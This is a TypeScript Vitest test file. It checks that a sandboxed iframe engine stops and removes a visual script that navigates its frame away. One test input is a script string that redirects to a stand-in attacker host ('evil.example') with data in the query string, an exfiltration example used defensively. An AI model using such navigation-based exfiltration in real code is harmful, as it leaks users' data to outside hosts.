import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'

/** Just enough DOM for the visual engine to mount a frame: an element is an EventTarget with a style and children. */
class FakeEl extends EventTarget {
  style: Record<string, string> = {}
  children: FakeEl[] = []
  parentElement: FakeEl | null = null
  attrs: Record<string, string> = {}
  className = ''
  title = ''
  srcdoc = ''
  isConnected = true
  hidden = false
  contentWindow = {}
  setAttribute(k: string, v: string) {
    this.attrs[k] = v
  }
  appendChild(c: FakeEl) {
    c.parentElement = this
    this.children.push(c)
    return c
  }
  remove() {
    if (this.parentElement) this.parentElement.children = this.parentElement.children.filter((c) => c !== this)
    this.parentElement = null
  }
  getBoundingClientRect() {
    return { top: 0, left: 0, bottom: 100, right: 100, width: 100, height: 100 }
  }
}

beforeEach(() => {
  const body = new FakeEl()
  vi.stubGlobal('document', { body, createElement: () => new FakeEl() })
  vi.stubGlobal('window', new EventTarget())
  vi.stubGlobal('location', { origin: 'http://127.0.0.1:5199' })
  vi.stubGlobal('getComputedStyle', () => ({ overflow: 'visible' }))
  vi.stubGlobal('requestAnimationFrame', () => 0)
  vi.stubGlobal('cancelAnimationFrame', () => {})
})
afterEach(() => vi.unstubAllGlobals())

describe('a visual script that navigates its frame', () => {
  it('is stopped and its frame removed, the moment the frame loads a second time', async () => {
    const { ViewEngine } = await import('../view/engine')
    const engine = new ViewEngine()
    const host = new FakeEl()
    const run = engine.run(host as unknown as HTMLElement, 'location = "https://evil.example/?d=" + 1', { key: 'k', json: () => '{}' }, { timeoutMs: 5000 })
    const frame = (document.body as unknown as FakeEl).children[0].children[0]
    expect(frame.attrs.sandbox).toBe('allow-scripts allow-pointer-lock')
    frame.dispatchEvent(new Event('load')) // the bootstrap
    expect(engine.isLive(frame as unknown as HTMLIFrameElement)).toBe(true)
    frame.dispatchEvent(new Event('load')) // somewhere else
    const r = await run
    expect(r.error?.message).toMatch(/tried to leave its sandbox/)
    expect(engine.isLive(frame as unknown as HTMLIFrameElement)).toBe(false)
    expect(frame.parentElement).toBeNull()
  })
})
